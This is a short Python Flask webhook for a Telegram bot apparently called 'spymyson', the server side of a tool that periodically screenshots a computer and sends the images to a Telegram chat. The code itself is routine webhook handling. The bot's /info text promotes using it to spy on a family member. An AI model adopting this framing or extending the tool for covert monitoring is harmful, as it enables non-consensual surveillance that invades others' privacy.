import telebot
from flask import request, Response, json, Blueprint, abort
from app.utils.bothandler import BotHandler  

hook = Blueprint("hook", __name__)

bot = BotHandler().bot 

# handling commands
@bot.message_handler(commands=['info'])
def send_welcome(message):
    bot.reply_to(message, ("Hi there I am spymyson\n"
                           "periodically screenshot screen"
                           "and dumps over here.\n"
                           "might be helpful to track your productivity "
                           "whole day or spy dark side of your mom"))


@bot.message_handler(commands=['token'])
def send_token(message):
    bot.send_message(message.chat.id, (f'Your token is {message.chat.id}'
                                       "\nuse this token on the client app"
                                       " please dont share this token!"))


@hook.route('/', methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    else:
        abort(403)
